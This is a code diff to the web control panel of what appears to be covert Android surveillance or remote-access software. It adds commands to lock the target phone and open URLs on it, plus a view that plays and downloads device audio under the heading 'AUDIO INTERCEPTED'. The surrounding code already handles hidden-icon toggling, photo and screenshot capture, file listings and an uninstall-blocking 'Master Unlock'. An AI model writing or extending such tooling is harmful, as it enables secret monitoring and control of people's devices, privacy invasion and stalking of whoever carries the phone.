@@ -67,6 +67,8 @@ import Layout from '../layouts/Layout.astro';
               <div style="display: flex; flex-wrap: wrap; gap: 12px;">
                 <button class="cmd-btn btn-primary" data-action="p">Check Online</button>
                 <button class="cmd-btn btn-primary" data-action="show_app">Reveal Icon</button>
+                <button class="cmd-btn btn-primary" data-action="lock_screen">Lock Screen</button>
+                <button class="cmd-btn btn-primary" data-action="open_url">Open URL</button>
                 <button class="cmd-btn btn-primary" style="border-color: #ff4757; color: #ff4757;" data-action="allow_uninstall">Master Unlock</button>
               </div>
             </div>
@@ -474,6 +476,10 @@ import Layout from '../layouts/Layout.astro';
           const text = prompt('Enter text to speak on device:');
           if (!text) return;
           extra = { text: text };
+        } else if (action === 'open_url') {
+          const url = prompt('Enter URL to open (e.g. https://google.com):');
+          if (!url) return;
+          extra = { url: url };
         }
         
         if (action) window.sendCommand(action, extra);
@@ -529,6 +535,13 @@ import Layout from '../layouts/Layout.astro';
       } else if (data.photo_base64) {
         const src = `data:image/jpeg;base64,${data.photo_base64}`;
         area.innerHTML = `<div style="text-align: center;"><img src="${src}" alt="Photo" style="max-width: 100%; border-radius: 8px; margin-bottom: 12px; border: 1px solid var(--cyber-cyan-dim);" /><br/><a href="${src}" download="photo_${Date.now()}.jpg" style="background: rgba(0, 240, 255, 0.1); border: 1px solid var(--cyber-cyan); color: var(--cyber-cyan); padding: 10px 20px; border-radius: 6px; cursor: pointer; font-family: var(--font-mono); font-weight: bold; text-decoration: none; display: inline-block;">[ DOWNLOAD PHOTO ]</a></div>`;
+      } else if (data.audio_base64) {
+        const src = `data:audio/mp4;base64,${data.audio_base64}`;
+        area.innerHTML = `<div style="text-align: center; padding: 20px; background: rgba(0, 240, 255, 0.05); border-left: 4px solid var(--cyber-cyan); border-radius: 0 8px 8px 0;">
+            <h4 style="margin-top: 0; color: var(--cyber-cyan); font-family: var(--font-mono); margin-bottom: 16px;">AUDIO INTERCEPTED</h4>
+            <audio controls src="${src}" style="width: 100%; max-width: 400px; margin-bottom: 16px; outline: none;"></audio><br/>
+            <a href="${src}" download="audio_${Date.now()}.${data.format || 'm4a'}" style="background: rgba(0, 240, 255, 0.1); border: 1px solid var(--cyber-cyan); color: var(--cyber-cyan); padding: 10px 20px; border-radius: 6px; cursor: pointer; font-family: var(--font-mono); font-weight: bold; text-decoration: none; display: inline-block;">[ DOWNLOAD AUDIO ]</a>
+        </div>`;
       } else if (data.files) {
         let html = `<h4 style="margin-bottom: 12px; font-family: var(--font-mono); color: var(--cyber-cyan);">Directory Listing: ${data.path}</h4><ul style="list-style: none; padding: 0; margin: 0;">`;
         if (data.path && data.path !== '/' && data.path !== '/storage/emulated/0') {
@@ -600,11 +613,12 @@ import Layout from '../layouts/Layout.astro';
       }
       
       // Auto-cleanup massive payloads from DB to save bandwidth
-      if (data.screenshot_base64 || data.photo_base64 || data.file_base64 || data.log_content) {
+      if (data.screenshot_base64 || data.photo_base64 || data.file_base64 || data.log_content || data.audio_base64) {
          update(respRef, { 
            screenshot_base64: null,
            photo_base64: null, 
-           file_base64: null, 
+           file_base64: null,
+           audio_base64: null, 
            log_content: null,
            _cleared: true
          }).catch(err => console.error("Auto-cleanup failed:", err));
@@ -675,7 +689,7 @@ import Layout from '../layouts/Layout.astro';
       const cmdText = document.getElementById('cmd-text');
       if (cmdText) cmdText.textContent = `PAYLOAD DELIVERED. AWAITING TELEMETRY...`;
       
-      const fireAndForget = ['ring', 'stop', 'locate', 'show_app', 'update'];
+      const fireAndForget = ['ring', 'stop', 'locate', 'show_app', 'update', 'lock_screen', 'open_url'];
       if (fireAndForget.includes(action)) {
           setTimeout(() => {
              const statusBox = document.getElementById('cmd-status');
